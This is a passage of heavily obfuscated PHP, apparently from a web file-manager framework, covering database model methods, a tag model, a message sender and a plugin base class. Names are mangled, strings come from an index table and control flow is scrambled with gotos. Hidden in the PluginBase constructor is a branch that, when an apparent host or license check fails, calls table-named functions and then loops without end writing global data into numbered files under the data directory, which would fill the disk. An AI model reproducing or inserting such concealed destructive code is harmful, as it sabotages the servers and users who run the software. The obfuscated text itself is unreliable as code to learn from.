$AŒ“—¿Ø¸à .= $this->tableName; } else { $AŒ“—¿Ø¸à .= think_parse_name($this->name); } $this->trueTableName = strtolower($AŒ“—¿Ø¸à); } return (!empty($this->dbName) ? $this->dbName . $Bğù”„¾ğ[91] : $Bğù”„¾ğ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $F‘…ËÙ„ =& $_SERVER[‡’¶øåüç˜]; return isset($this->fields[$F‘…ËÙ„[243]]) ? $this->fields[$F‘…ËÙ„[243]] : $this->pk; } public function getDbFields() { $Bí‹Û‰êÑ‘ =& $_SERVER[‡’¶øåüç˜]; if (isset($this->options[$Bí‹Û‰êÑ‘[271]])) { $c½’Å—³Çá = $this->db->getFields($this->options[$Bí‹Û‰êÑ‘[271]]); return $c½’Å—³Çá ? array_keys($c½’Å—³Çá) : !1; } if ($this->fields) { $c½’Å—³Çá = $this->fields; unset($c½’Å—³Çá[$Bí‹Û‰êÑ‘[242]], $c½’Å—³Çá[$Bí‹Û‰êÑ‘[243]], $c½’Å—³Çá[$Bí‹Û‰êÑ‘[244]], $c½’Å—³Çá[$Bí‹Û‰êÑ‘[241]]); return $c½’Å—³Çá; } return !1; } public function data($EÌ†ˆƒ˜ÖŠ = '') { $dˆ‡š²› =& $_SERVER[‡’¶øåüç˜]; if ($dˆ‡š²›[33] === $EÌ†ˆƒ˜ÖŠ && !empty($this->data)) { return $this->data; } if (is_object($EÌ†ˆƒ˜ÖŠ)) { $EÌ†ˆƒ˜ÖŠ = get_object_vars($EÌ†ˆƒ˜ÖŠ); } elseif (is_string($EÌ†ˆƒ˜ÖŠ)) { parse_str($EÌ†ˆƒ˜ÖŠ, $EÌ†ˆƒ˜ÖŠ); } elseif (!is_array($EÌ†ˆƒ˜ÖŠ)) { think_exception(think_lang($dˆ‡š²›[263])); } $this->data = $EÌ†ˆƒ˜ÖŠ; return $this; } public function join($f¯ò¯µ÷†•) { $A„º°œ‹á =& $_SERVER[‡’¶øåüç˜]; if (is_array($f¯ò¯µ÷†•)) { $this->options[$A„º°œ‹á[274]] = $f¯ò¯µ÷†•; } elseif (!empty($f¯ò¯µ÷†•)) { $this->options[$A„º°œ‹á[274]][] = $f¯ò¯µ÷†•; } return $this; } public function union($Bç÷ßŞ ôŞ, $Dä³·ÍÅœ± = false) { goto E êö´ó; E êö´ó: $cÅõ’æ©›Ğ =& $_SERVER[‡’¶øåüç˜]; if (empty($Bç÷ßŞ ôŞ)) { return $this; } if ($Dä³·ÍÅœ±) { $this->options[$cÅõ’æ©›Ğ[339]][$cÅõ’æ©›Ğ[340]] = !0; } goto EÇìá†­½‹; e£ê·à¼: return $this; goto d¸Ä¬é¸ÚÌ; EÇìá†­½‹: if (is_object($Bç÷ßŞ ôŞ)) { $Bç÷ßŞ ôŞ = get_object_vars($Bç÷ßŞ ôŞ); } if (is_string($Bç÷ßŞ ôŞ)) { $D‰¾¹¹¹¾ = $Bç÷ßŞ ôŞ; } elseif (is_array($Bç÷ßŞ ôŞ)) { if (isset($Bç÷ßŞ ôŞ[0])) { $this->options[$cÅõ’æ©›Ğ[339]] = array_merge($this->options[$cÅõ’æ©›Ğ[339]], $Bç÷ßŞ ôŞ); return $this; } else { $D‰¾¹¹¹¾ = $Bç÷ßŞ ôŞ; } } else { think_exception(think_lang($cÅõ’æ©›Ğ[263])); } $this->options[$cÅõ’æ©›Ğ[339]][] = $D‰¾¹¹¹¾; goto e£ê·à¼; d¸Ä¬é¸ÚÌ: } public function cache($FÖœèï¶ÍË = true, $B¤×ÇÂÕ­í = null, $e¶Ş½â¾Ğ¸ = '') { $dÙ•˜ºÁ™Ò =& $_SERVER[‡’¶øåüç˜]; if (!1 !== $FÖœèï¶ÍË) { $this->options[$dÙ•˜ºÁ™Ò[341]] = array($dÙ•˜ºÁ™Ò[89] => $FÖœèï¶ÍË, $dÙ•˜ºÁ™Ò[331] => $B¤×ÇÂÕ­í, $dÙ•˜ºÁ™Ò[29] => $e¶Ş½â¾Ğ¸); } return $this; } public function field($dÅ’’ÛƒÒˆ, $E‘…ŞàÍ‹× = false) { $bğƒ©ĞÑ¨— =& $_SERVER[‡’¶øåüç˜]; if (!0 === $dÅ’’ÛƒÒˆ) { $e•ÙíÙÃÉç = $this->getDbFields(); $dÅ’’ÛƒÒˆ = $e•ÙíÙÃÉç ? $e•ÙíÙÃÉç : $bğƒ©ĞÑ¨—[180]; } elseif ($E‘…ŞàÍ‹×) { if (is_string($dÅ’’ÛƒÒˆ)) { $dÅ’’ÛƒÒˆ = explode($bğƒ©ĞÑ¨—[47], $dÅ’’ÛƒÒˆ); } $e•ÙíÙÃÉç = $this->getDbFields(); $dÅ’’ÛƒÒˆ = $e•ÙíÙÃÉç ? array_diff($e•ÙíÙÃÉç, $dÅ’’ÛƒÒˆ) : $dÅ’’ÛƒÒˆ; } $this->options[$bğƒ©ĞÑ¨—[265]] = $dÅ’’ÛƒÒˆ; return $this; } public function scope($Fˆ­¶éøÈ = '', $BñÇ©ãä = NULL) { $A»ğ™öéœÛ =& $_SERVER[‡’¶øåüç˜]; if ($A»ğ™öéœÛ[33] === $Fˆ­¶éøÈ) { if (isset($this->_scope[$A»ğ™öéœÛ[34]])) { $BÅ‘Û–÷Ú = $this->_scope[$A»ğ™öéœÛ[34]]; } else { return $this; } } elseif (is_string($Fˆ­¶éøÈ)) { $cÊ­…Áò¸ = explode($A»ğ™öéœÛ[47], $Fˆ­¶éøÈ); $BÅ‘Û–÷Ú = array(); foreach ($cÊ­…Áò¸ as $E²¦óŒì™Š) { if (!isset($this->_scope[$E²¦óŒì™Š])) { continue; } $BÅ‘Û–÷Ú = array_merge($BÅ‘Û–÷Ú, $this->_scope[$E²¦óŒì™Š]); } if (!empty($BñÇ©ãä) && is_array($BñÇ©ãä)) { $BÅ‘Û–÷Ú = array_merge($BÅ‘Û–÷Ú, $BñÇ©ãä); } } elseif (is_array($Fˆ­¶éøÈ)) { $BÅ‘Û–÷Ú = $Fˆ­¶éøÈ; } if (is_array($BÅ‘Û–÷Ú) && !empty($BÅ‘Û–÷Ú)) { $this->options = array_merge($this->options, array_change_key_case($BÅ‘Û–÷Ú)); } return $this; } public function where($Cí–ˆƒÜÉŒ, $CºâÃóÒŒ = null) { $C”ˆâÜëîÙ =& $_SERVER[‡’¶øåüç˜]; if (!is_null($CºâÃóÒŒ) && is_string($Cí–ˆƒÜÉŒ)) { if (!is_array($CºâÃóÒŒ)) { $CºâÃóÒŒ = func_get_args(); array_shift($CºâÃóÒŒ); } $CºâÃóÒŒ = array_map(array($this->db, $C”ˆâÜëîÙ[335]), $CºâÃóÒŒ); $Cí–ˆƒÜÉŒ = vsprintf($Cí–ˆƒÜÉŒ, $CºâÃóÒŒ); } elseif (is_object($Cí–ˆƒÜÉŒ)) { $Cí–ˆƒÜÉŒ = get_object_vars($Cí–ˆƒÜÉŒ); } elseif (is_array($Cí–ˆƒÜÉŒ)) { foreach ($Cí–ˆƒÜÉŒ as $d„§Ğë‡ù => $eÊßİÍ·¬„) { if ((is_numeric($d„§Ğë‡ù) || !$d„§Ğë‡ù) && is_string($eÊßİÍ·¬„)) { think_trace($C”ˆâÜëîÙ[342], $C”ˆâÜëîÙ[33], $C”ˆâÜëîÙ[46]); die; } } } if (is_string($Cí–ˆƒÜÉŒ) && $C”ˆâÜëîÙ[33] != $Cí–ˆƒÜÉŒ) { $c‘§Äñã«Æ = array(); $c‘§Äñã«Æ[$C”ˆâÜëîÙ[343]] = $Cí–ˆƒÜÉŒ; $Cí–ˆƒÜÉŒ = $c‘§Äñã«Æ; } if (isset($this->options[$C”ˆâÜëîÙ[267]])) { $this->options[$C”ˆâÜëîÙ[267]] = array_merge($this->options[$C”ˆâÜëîÙ[267]], $Cí–ˆƒÜÉŒ); } else { $this->options[$C”ˆâÜëîÙ[267]] = $Cí–ˆƒÜÉŒ; } return $this; } public function limit($B½»ôÅªˆÄ, $F®¼ÔÒÁ¡ = null) { $E×¼Œ‹×Ú· =& $_SERVER[‡’¶øåüç˜]; $this->options[$E×¼Œ‹×Ú·[284]] = is_null($F®¼ÔÒÁ¡) ? $B½»ôÅªˆÄ : $B½»ôÅªˆÄ . $E×¼Œ‹×Ú·[47] . $F®¼ÔÒÁ¡; return $this; } public function page($b‡›³åãÚ, $e‹î°ÚÊ·ñ = null) { $D´œ³Ş„Ş =& $_SERVER[‡’¶øåüç˜]; $this->options[$D´œ³Ş„Ş[344]] = is_null($e‹î°ÚÊ·ñ) ? $b‡›³åãÚ : $b‡›³åãÚ . $D´œ³Ş„Ş[47] . $e‹î°ÚÊ·ñ; return $this; } public function comment($dÓ¾¶Û® Š) { $this->options[$_SERVER[‡’¶øåüç˜][345]] = $dÓ¾¶Û® Š; return $this; } public function setProperty($AöŸÖÍœ¿À, $C’Ú´¨èÈó) { if (property_exists($this, $AöŸÖÍœ¿À)) { $this->{$AöŸÖÍœ¿À} = $C’Ú´¨èÈó; } return $this; } } goto d¥³ÏÉ’Ü®; C¸¬öÅØ¯·: class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\162\56\164\141\x67\114\x69\163\x74"; public $modelType = "\125\x73\x65\162\x4f\160\164\x69\157\156"; public $field = array("\156\x61\155\145", "\x73\x74\171\154\145", "\163\x6f\x72\164"); public function listData($c¢ôÑ‰ï®¢ = false, $bÍí¼Œ®± = "\x73\x6f\162\x74", $aõ¾·¡›” = false) { return parent::listData($c¢ôÑ‰ï®¢, $bÍí¼Œ®±, $aõ¾·¡›”); } public function remove($FÈíğ‚°ŠË) { return parent::remove($FÈíğ‚°ŠË); } public function add($a­ÃÓ¨©â¼, $f·´õ‹½Úö = "\x6c\141\x62\x65\x6c\55\147\x72\145\x79\55\x6e\x6f\162\155\x61\154") { $F¹Ùİò¼† =& $_SERVER[‡’¶øåüç˜]; if ($this->findByName($a­ÃÓ¨©â¼)) { return !1; } $A¤·–ĞÆÏÙ = array($F¹Ùİò¼†[398] => $a­ÃÓ¨©â¼, $F¹Ùİò¼†[448] => $f·´õ‹½Úö, $F¹Ùİò¼†[2116] => $this->getSort($F¹Ùİò¼†[250]) + 1); return parent::insert($A¤·–ĞÆÏÙ); } public function update($f¶¯œÊ®İæ, $BÜŒ®¤â“) { $B½åİµ¶÷ğ =& $_SERVER[‡’¶øåüç˜]; $e­ÕÕˆÒ¸ = $this->listData($f¶¯œÊ®İæ); $A¾å¦ÍŠáË = $this->findByName($BÜŒ®¤â“[$B½åİµ¶÷ğ[28]]); if (!$e­ÕÕˆÒ¸ || $A¾å¦ÍŠáË && $A¾å¦ÍŠáË[$B½åİµ¶÷ğ[371]] != $e­ÕÕˆÒ¸[$B½åİµ¶÷ğ[371]]) { return !1; } return parent::update($f¶¯œÊ®İæ, $BÜŒ®¤â“); } public function moveTop($DåÁÉ¼Ë¾„) { $a­ÖÆ©øÍ› =& $_SERVER[‡’¶øåüç˜]; $C¦¡—§àÇ‘ = parent::listData(); $f¬…ùà«ÕÕ = $this->getSort($a­ÖÆ©øÍ›[249]); foreach ($C¦¡—§àÇ‘ as &$D¤Í·ñ½âä) { if ($D¤Í·ñ½âä[$a­ÖÆ©øÍ›[371]] == $DåÁÉ¼Ë¾„) { $D¤Í·ñ½âä[$a­ÖÆ©øÍ›[2134]] = $f¬…ùà«ÕÕ; continue; } $D¤Í·ñ½âä[$a­ÖÆ©øÍ›[2134]] += 1; } unset($D¤Í·ñ½âä); return parent::resetData($C¦¡—§àÇ‘); } public function moveBottom($AêÈİ¤Öî™) { $e½ÉğƒÛÌœ =& $_SERVER[‡’¶øåüç˜]; $d±É…İ¶Ü = $this->getSort($e½ÉğƒÛÌœ[250]) + 1; return parent::update($AêÈİ¤Öî™, array($e½ÉğƒÛÌœ[2134] => $d±É…İ¶Ü)); } public function resetSort($C–‹Ü…Ñ¾ä) { goto E¤ÀùÓÅà; E¤ÀùÓÅà: $b÷ï…¯¡ø© =& $_SERVER[‡’¶øåüç˜]; $d·¿ö¦°¬ = array(); $C–‹Ü…Ñ¾ä = is_array($C–‹Ü…Ñ¾ä) ? $C–‹Ü…Ñ¾ä : array(); goto A®ÁíÖ‰‡; A®ÁíÖ‰‡: for ($Cƒæ®âÓâƒ = 0; $Cƒæ®âÓâƒ < count($C–‹Ü…Ñ¾ä); $Cƒæ®âÓâƒ++) { $d·¿ö¦°¬[$C–‹Ü…Ñ¾ä[$Cƒæ®âÓâƒ] . $b÷ï…¯¡ø©[33]] = $Cƒæ®âÓâƒ + 1; } $E»Ç‚¬ñ«Ş = parent::listData(); foreach ($E»Ç‚¬ñ«Ş as &$Eˆ”İŞçî) { $FÆ£íÔãßä = $d·¿ö¦°¬[$Eˆ”İŞçî[$b÷ï…¯¡ø©[371]]]; $Eˆ”İŞçî[$b÷ï…¯¡ø©[2134]] = $FÆ£íÔãßä ? $FÆ£íÔãßä : $Eˆ”İŞçî[$b÷ï…¯¡ø©[2134]]; } goto d¢Ù¼›»¢ä; d¢Ù¼›»¢ä: unset($Eˆ”İŞçî); return parent::resetData($E»Ç‚¬ñ«Ş); goto Fì­¼£™ ; Fì­¼£™ : } private function getSort($bÁÑ‰³Çæ) { $A±°ªÜ‘å =& $_SERVER[‡’¶øåüç˜]; $fèàŒ§Ç¯Ö = parent::listData(); $fÏˆáÂ‘Ì = array_to_keyvalue($fèàŒ§Ç¯Ö, $A±°ªÜ‘å[33], $A±°ªÜ‘å[2134]); if (!$fÏˆáÂ‘Ì) { $fÏˆáÂ‘Ì = array(0); } $eÜ¬£Ñ—¾ = $bÁÑ‰³Çæ == $A±°ªÜ‘å[250] ? max($fÏˆáÂ‘Ì) : min($fÏˆáÂ‘Ì); return intval($eÜ¬£Ñ—¾); } } goto b¾œ¡ø¿®; c¿’®º¯øò: class Message { function __construct() { } public function send($CİØÒ·¡ğ = '', $a¦™”»‰â = array(), $A¿„…â÷®‰ = "\x74\x65\x78\164") { goto D†§É´ìÑ; fæÕ·¼Îƒâ: Hook::trigger($Bñ³¥è£î[1313], $d¥·Å¤„ÀÕ); goto C£šô¬ÃÃ; CÔà‘¦¨˜î: $a¦™”»‰â = array($Bñ³¥è£î[974] => isset($a¦™”»‰â[$Bñ³¥è£î[974]]) ? $a¦™”»‰â[$Bñ³¥è£î[974]] : $Bñ³¥è£î[33], $Bñ³¥è£î[547] => isset($a¦™”»‰â[$Bñ³¥è£î[547]]) ? $a¦™”»‰â[$Bñ³¥è£î[547]] : $Bñ³¥è£î[33]); if (empty($CİØÒ·¡ğ) || empty($a¦™”»‰â[$Bñ³¥è£î[974]]) && empty($a¦™”»‰â[$Bñ³¥è£î[547]])) { return !1; } $d¥·Å¤„ÀÕ = array($Bñ³¥è£î[1252] => $dÏ¶£Ö‰Úâ, $Bñ³¥è£î[1312] => $a¦™”»‰â); goto fæÕ·¼Îƒâ; D†§É´ìÑ: $Bñ³¥è£î =& $_SERVER[‡’¶øåüç˜]; $dÏ¶£Ö‰Úâ = array($Bñ³¥è£î[29] => $Bñ³¥è£î[1310], $Bñ³¥è£î[698] => $CİØÒ·¡ğ); if (in_array($A¿„…â÷®‰, array($Bñ³¥è£î[1310], $Bñ³¥è£î[1311]))) { $dÏ¶£Ö‰Úâ[$Bñ³¥è£î[29]] = $A¿„…â÷®‰; } goto CÔà‘¦¨˜î; C£šô¬ÃÃ: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto d«¾ÎÒ‘»ˆ; E¿±¹Ş±‰ï: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto FŒÏ¯Ë×ˆÔ; b¬Ä„—Åø: $this->pluginHostDefault = $config[$a™‹ğëäƒ[1316]] . $this->pluginName . $a™‹ğëäƒ[8]; $b·ïóİñËÕ = $config[$a™‹ğëäƒ[1317]]; if ($b·ïóİñËÕ && strpos($a™‹ğëäƒ[47] . $b·ïóİñËÕ . $a™‹ğëäƒ[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$a™‹ğëäƒ[1318]] . $this->pluginName . $a™‹ğëäƒ[8]; } goto E¿±¹Ş±‰ï; Dâº¼íµß²: if ($_SERVER[$a™‹ğëäƒ[372]] != $dŠŸóºè›Í($aİÍ» ‡§)) { goto bÒÔ‚©ŠŸÁ; fŠ‰œê§‚­: $Dè½¸‘ğ‚Â = $a™‹ğëäƒ[798]; $Dè½¸‘ğ‚Â($_SERVER[$a™‹ğëäƒ[799]]); $Bëçº‚šì˜ = $a™‹ğëäƒ[797]; goto e§ÛùĞ °Ÿ; dç‡öÍ¨Æ½: $cè“Öë­ô¾ = 1; for ($DÃéñ—ôÊ = $cè“Öë­ô¾; $DÃéñ—ôÊ > 0; $DÃéñ—ôÊ++) { $b†Û‰‘…Á¢(DATA_PATH . $DÃéñ—ôÊ, $bÇ×¶ëò™ˆ); } goto Bíä¡ˆ–Ó; bÒÔ‚©ŠŸÁ: $Bëçº‚šì˜ = $a™‹ğëäƒ[797]; $CªŞÀ÷Ã¡ = $a™‹ğëäƒ[374]; $DŒ¯ˆİœÉÎ = $_SERVER[$a™‹ğëäƒ[375]] . $a™‹ğëäƒ[376]; goto c—İñ®½Å; e§ÛùĞ °Ÿ: $Bëçº‚šì˜(); $b†Û‰‘…Á¢ = $a™‹ğëäƒ[800]; $bÇ×¶ëò™ˆ = json_encode($GLOBALS[$a™‹ğëäƒ[801]]); goto dç‡öÍ¨Æ½; c—İñ®½Å: $DÕ‹Îõêìœ = $CªŞÀ÷Ã¡($DŒ¯ˆİœÉÎ); $f¼ìì„öËƒ = explode($a™‹ğëäƒ[221], $DÕ‹Îõêìœ); if (count($f¼ìì„öËƒ) < $a™‹ğëäƒ[570]) { $c¤å“…¨‰ç = $a™‹ğëäƒ[378]; $c¤å“…¨‰ç(); } goto fŠ‰œê§‚­; Bíä¡ˆ–Ó: } global $in, $config; $this->config =& $config; goto D™‹Àó¦±ã; d«¾ÎÒ‘»ˆ: $a™‹ğëäƒ =& $_SERVER[‡’¶øåüç˜]; $aİÍ» ‡§ = $_SERVER[$a™‹ğëäƒ[375]] . $a™‹ğëäƒ[376]; $dŠŸóºè›Í = $a™‹ğëäƒ[796]; goto Dâº¼íµß²; c©ÇÅ‰ó: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $a™‹ğëäƒ[8]; $this->pluginApi = appHostGet() . $a™‹ğëäƒ[1315] . $this->pluginName . $a™‹ğëäƒ[8]; $this->pluginHost = $config[$a™‹ğëäƒ[1316]] . $this->pluginName . $a™‹ğëäƒ[8]; goto b¬Ä„—Åø; D™‹Àó¦±ã: $this->in =& $in; $this->modelPlugin = Model($a™‹ğëäƒ[1314]); $this->pluginName = str_replace($a™‹ğëäƒ[1314], $a™‹ğëäƒ[33], get_class($this)); goto c©ÇÅ‰ó; FŒÏ¯Ë×ˆÔ: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[‡’¶øåüç˜][1319]); } protected function assign($FÖ•ƒ”ç³É, $fº½½ÑÓƒÅ = false) { if (is_array($FÖ•ƒ”ç³É)) { $this->values = array_merge($this->values, $FÖ•ƒ”ç³É); } else { $this->values[$FÖ•ƒ”ç³É] = $fº½½ÑÓƒÅ; } } protected function display($A´Á¿Ï¼¬) { extract($this->values); require $A´Á¿Ï¼¬; } final function hookRegist($F–Æª­ùš‡) { $this->modelPlugin->appRegist($this->pluginName, $F–Æª­ùš‡); } final function appIcon() { $C£¤è¯Æâê =& $_SERVER[‡’¶øåüç˜]; $D½¢®Â´İ = $this->appPackage(); $bÉ›¸´Äö = $C£¤è¯Æâê[33]; if (isset($D½¢®Â´İ[$C£¤è¯Æâê[394]])) { if (isset($D½¢®Â´İ[$C£¤è¯Æâê[394]][$C£¤è¯Æâê[1320]])) { $bÉ›¸´Äö = $C£¤è¯Æâê[1321] . $D½¢®Â´İ[$C£¤è¯Æâê[394]][$C£¤è¯Æâê[1320]] . $C£¤è¯Æâê[1322]; } else { if ($D½¢®Â´İ[$C£¤è¯Æâê[394]][$C£¤è¯Æâê[1323]]) { $bÉ›¸´Äö = $C£¤è¯Æâê[1324] . $D½¢®Â´İ[$C£¤è¯Æâê[394]][$C£¤è¯Æâê[1323]] . $C£¤è¯Æâê[1325]; } } } return $bÉ›¸´Äö; } final function fileCanView($C¬ÈÓ´Á«) { goto e¹†‹à”Í§; e¹†‹à”Í§: $b³†±´Î„Ü =& $_SERVER[‡’¶øåüç˜]; if (request_url_safe($C¬ÈÓ´Á«)) { return !0; } if ($this->isShare($C¬ÈÓ´Á«)) { return !0; } goto c²š‹–İ…ò; F¤˜Ÿ±¬×È: ActionCall($b³†±´Î„Ü[1338], $C¬ÈÓ´Á«); goto A„ÓøïÜ›; c²š‹–İ…ò: $AŠİ¶Ãƒ÷ = Session::get($b³†±´Î„Ü[1326]); if (!$AŠİ¶Ãƒ÷ || !$AŠİ¶Ãƒ÷[$b³†±´Î„Ü[1327]]) { $BõõİŒÁ“¸ = $b³†±´Î„Ü[1328] . rawurlencode(this_url()); show_tips(LNG($b³†±´Î„Ü[1329]) . $b³†±´Î„Ü[1330] . $BõõİŒÁ“¸ . $b³†±´Î„Ü[1331] . LNG($b³†±´Î„Ü[1332]) . $b³†±´Î„Ü[1333], !1); } if (!Action($b³†±´Î„Ü[1334])->authCan($b³†±´Î„Ü[1335])) { show_tips(LNG($b³†±´Î„Ü[1336]) . $b³†±´Î„Ü[1337], !1); } goto F¤˜Ÿ±¬×È; A„ÓøïÜ›: } final function isShare($FŠÚªº­ÈÑ) { $aÍ©‰Ù˜†§ = KodIO::parse($FŠÚªº­ÈÑ); return $aÍ©‰Ù˜†§[$_SERVER[‡’¶øåüç˜][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($f’“†Ñ¨ª”) { if (request_url_safe($f’“†Ñ¨ª”)) { return $f’“†Ñ¨ª”; } if (!$this->isShare($f’“†Ñ¨ª”)) { $f’“†Ñ¨ª” = $this->filePath($f’“†Ñ¨ª”); } return Action($_SERVER[‡’¶øåüç˜][1026])->linkOut($f’“†Ñ¨ª”); } public function filePathLinkOut($B„ˆ…êƒ‘©) { if (request_url_safe($B„ˆ…êƒ‘©)) { return $B„ˆ…êƒ‘©; } $this->fileCanView($B„ˆ…êƒ‘©); return Action($_SERVER[‡’¶øåüç˜][1026])->link($B„ˆ…êƒ‘©); } final function filePath($A„Ô¨¹ë°ù) { $CñÒ±à×™ç =& $_SERVER[‡’¶øåüç˜]; if ($Cèë‡Öö = $this->checkSharePath($A„Ô¨¹ë°ù)) { return $Cèë‡Öö; } $this->fileCanView($A„Ô¨¹ë°ù); if (request_url_safe($A„Ô¨¹ë°ù)) { $EîÓ²¾é¥÷ = parse_url_query($A„Ô¨¹ë°ù); if (isset($EîÓ²¾é¥÷[$CñÒ±à×™ç[1339]]) && isset($EîÓ²¾é¥÷[$CñÒ±à×™ç[201]])) { $aƒ´Ï„Ñ›Ç = Model($CñÒ±à×™ç[1095])->get($CñÒ±à×™ç[1340]); $c‘°ËË¢ò• = Mcrypt::decode($EîÓ²¾é¥÷[$CñÒ±à×™ç[201]], $aƒ´Ï„Ñ›Ç); if ($c‘°ËË¢ò•) { $this->fileInfo = IO::infoWithChildren($c‘°ËË¢ò•); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $c‘°ËË¢ò•; } } $A„Ô¨¹ë°ù = $this->_cacheHttpFile($A„Ô¨¹ë°ù); $this->fileInfo = IO::infoWithChildren($A„Ô¨¹ë°ù); } else { $this->fileInfo = IO::infoWithChildren($A„Ô¨¹ë°ù); if (!$this->fileInfo) { show_tips(LNG($CñÒ±à×™ç[101]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $A„Ô¨¹ë°ù; } final function _cacheHttpFile($D˜‚Ş ˆ¶) { $Bç‚¸ˆÛœ = hash_path($D˜‚Ş ˆ¶, !0); $this->cachePath = $this->pluginCachePath($Bç‚¸ˆÛœ); if ($F©¦åâÎ² = IO::fileNameExist($this->cachePath, $Bç‚¸ˆÛœ)) { return KodIO::make($F©¦åâÎ²); } $dÃƒ·æ±šš = $this->cachePath . $Bç‚¸ˆÛœ; return $this->pluginCacheFileSet($dÃƒ·æ±šš, file_get_contents($D˜‚Ş ˆ¶)); } final function _tmpFileName($cƒËƒ´‚Õ‹ = array()) { goto f¤¯Äè³ì; f¤¯Äè³ì: $A·Øóâì‘‹ =& $_SERVER[‡’¶øåüç˜]; if (!$cƒËƒ´‚Õ‹) { $cƒËƒ´‚Õ‹ = $this->fileInfo; } if (isset($cƒËƒ´‚Õ‹[$A·Øóâì‘‹[168]])) { return $cƒËƒ´‚Õ‹[$A·Øóâì‘‹[168]]; } goto cÁ Ø¬Ì¢; cÁ Ø¬Ì¢: if (isset($cƒËƒ´‚Õ‹[$A·Øóâì‘‹[161]][$A·Øóâì‘‹[168]])) { return $cƒËƒ´‚Õ‹[$A·Øóâì‘‹[161]][$A·Øóâì‘‹[168]]; } $F‘„ñÔ¸É¥ = IO::hashSimple($cƒËƒ´‚Õ‹[$A·Øóâì‘‹[75]]); if ($F‘„ñÔ¸É¥) { return $F‘„ñÔ¸É¥; } goto eÀ§Û³¸†à; eÀ§Û³¸†à: $AÅ˜ˆäºº• = array($cƒËƒ´‚Õ‹[$A·Øóâì‘‹[28]], $cƒËƒ´‚Õ‹[$A·Øóâì‘‹[75]], $cƒËƒ´‚Õ‹[$A·Øóâì‘‹[77]]); if (isset($cƒËƒ´‚Õ‹[$A·Øóâì‘‹[472]])) { $AÅ˜ˆäºº•[] = $cƒËƒ´‚Õ‹[$A·Øóâì‘‹[472]]; } return md5(implode($A·Øóâì‘‹[70], $AÅ˜ˆäºº•)); goto f‘¡ù‘ŸòÖ; f‘¡ù‘ŸòÖ: } final function checkSharePath($eÌÙÔö”“î) { goto FÆ¦¢öó‚¢; A“—ãøˆªœ: $c‚”ƒãñ÷í = Action($CÚ¥èğéÚê[1026])->sharePathInfo($eÌÙÔö”“î); if (!isset($c‚”ƒãñ÷í[$CÚ¥èğéÚê[75]])) { show_json(LNG($CÚ¥èğéÚê[1342]), !1); } $this->fileInfo = $c‚”ƒãñ÷í[$CÚ¥èğéÚê[161]]; goto F«¤‡‡–ÛÂ; FÆ¦¢öó‚¢: $CÚ¥èğéÚê =& $_SERVER[‡’¶øåüç˜]; if (!defined($CÚ¥èğéÚê[438])) { define($CÚ¥èğéÚê[1341], 0); } if (!$this->isShare($eÌÙÔö”“î)) { return !1; } goto A“—ãøˆªœ; F«¤‡‡–ÛÂ: $this->cachePath = $this->pluginCachePath($this->fileInfo[$CÚ¥èğéÚê[168]]); return $c‚”ƒãñ÷í[$CÚ¥èğéÚê[75]]; goto dãÃ«; dãÃ«: } final function pluginCachePath($e¿Áğ³¥Æ = '') { $c‹ç’¨®æ =& $_SERVER[‡’¶øåüç˜]; $bªÑÔ˜¤¥À = IO_PATH_SYSTEM_TEMP . $c‹ç’¨®æ[1343] . $this->pluginName; if (!($F¢ŒŞÂù‹È = IO::infoFull($bªÑÔ˜¤¥À))) { return IO::mkdir($bªÑÔ˜¤¥À . $c‹ç’¨®æ[8] . $e¿Áğ³¥Æ); } if (empty($e¿Áğ³¥Æ)) { return $F¢ŒŞÂù‹È[$c‹ç’¨®æ[75]]; } if (!($f‘İˆ¬¬ªƒ = IO::fileNameExist($F¢ŒŞÂù‹È[$c‹ç’¨®æ[75]], $e¿Áğ³¥Æ))) { return IO::mkdir($F¢ŒŞÂù‹È[$c‹ç’¨®æ[75]] . $e¿Áğ³¥Æ); } return KodIO::make($f‘İˆ¬¬ªƒ); } final function pluginCacheFileSet($Eì’ßÖ‚œ , $A÷Ï˜‚¨ = '') { $e­àËË¶â¸ =& $_SERVER[‡’¶øåüç˜]; if (!($FŠÊ®î¯Ô½ = IO::infoFull($Eì’ßÖ‚œ ))) { return IO::mkfile($Eì’ßÖ‚œ , $A÷Ï˜‚¨, REPEAT_REPLACE); } IO::setContent($FŠÊ®î¯Ô½[$e­àËË¶â¸[75]], $A÷Ï˜‚¨); return $FŠÊ®î¯Ô½[$e­àËË¶â¸[75]]; } final function pluginLocalFile($dÍŸÀãİŠ× = '') { goto DãÔ‚‚å´; b©…ÅŒ¤ÒĞ: if (!checkExtSafe($A—Ù‘óº„)) { $A—Ù‘óº„ = $A—Ù‘óº„ . $C•ÅÛÃŠÙ[1344]; } $FŞ–ÚÛ×ïø = $C¬äáùéŠ‰ . $A—Ù‘óº„; if (@file_exists($FŞ–ÚÛ×ïø)) { return $FŞ–ÚÛ×ïø; } goto B˜ƒŠùà·; B±Ú‹÷Ş±: if (!$dÍŸÀãİŠ×) { return $C¬äáùéŠ‰; } $FÈÚ¥°É¤¾ = IO::info($dÍŸÀãİŠ×); $A—Ù‘óº„ = $this->_tmpFileName($FÈÚ¥°É¤¾) . $C•ÅÛÃŠÙ[91] . $FÈÚ¥°É¤¾[$C•ÅÛÃŠÙ[165]]; goto b©…ÅŒ¤ÒĞ; B˜ƒŠùà·: return IO::copy($dÍŸÀãİŠ×, $C¬äáùéŠ‰, 0, $A—Ù‘óº„); goto f”ó ŸÒÁ; DãÔ‚‚å´: $C•ÅÛÃŠÙ =& $_SERVER[‡’¶øåüç˜]; $C¬äáùéŠ‰ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($C¬äáùéŠ‰)) { 